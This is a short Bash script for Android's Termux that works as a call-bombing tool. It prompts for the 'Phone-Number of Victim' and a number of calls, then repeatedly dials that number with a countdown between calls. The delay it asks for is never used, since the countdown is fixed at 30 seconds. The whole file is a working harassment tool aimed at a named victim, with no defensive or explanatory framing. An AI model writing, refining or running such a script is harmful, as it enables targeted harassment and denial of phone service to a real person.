i=1


echo -ne  "Enter Phone-Number of Victim: "
read phonenumber
echo -ne "Number of calls : "
read num
echo -ne  "Dealy in sec [30 recommended : ]"
read sleep

until [ $i -gt $num ]

do
  echo "Number of Call Sent -->" $i
  ((i=i+1))
  termux-telephony-call $phonenumber
  j=30
  until [ $j -lt 0 ]
        do
        echo -ne "Next Call in -->" $j\\r
        sleep 1
        ((j=j-1))
        done
echo "N"
done
